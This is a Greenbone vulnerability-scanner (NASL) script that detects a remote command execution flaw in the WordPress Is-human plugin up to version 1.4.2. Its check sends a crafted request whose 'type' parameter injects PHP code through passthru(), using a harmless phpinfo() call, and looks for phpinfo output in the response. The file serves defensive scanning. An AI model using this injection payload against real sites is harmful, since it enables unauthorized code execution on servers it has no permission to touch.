# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802021");
  script_version("2024-06-28T05:05:33+0000");
  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("WordPress Is-human Plugin 'passthru()' Function RCE Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/67500");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17299");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/is-human");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101497");

  script_tag(name:"impact", value:"Successful exploitation will let remote attackers to execute
  malicious commands in the context of an affected site, also remote code execution is possible.");

  script_tag(name:"affected", value:"Is-human WordPress plugin version 1.4.2 and prior.");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
  input to the 'passthru()' function in 'wp-content/plugins/is-human/engine.php',
  which allows attackers to execute commands in the context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"WordPress Is-human Plugin is prone to a remote command execution (RCE) vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/is-human/engine.php?action=log-reset&type=ih_options();passthru(phpinfo());error";

req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(">phpinfo()<" >< res && ">System <" >< res && ">Configuration<" >< res && ">PHP Core<" >< res){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
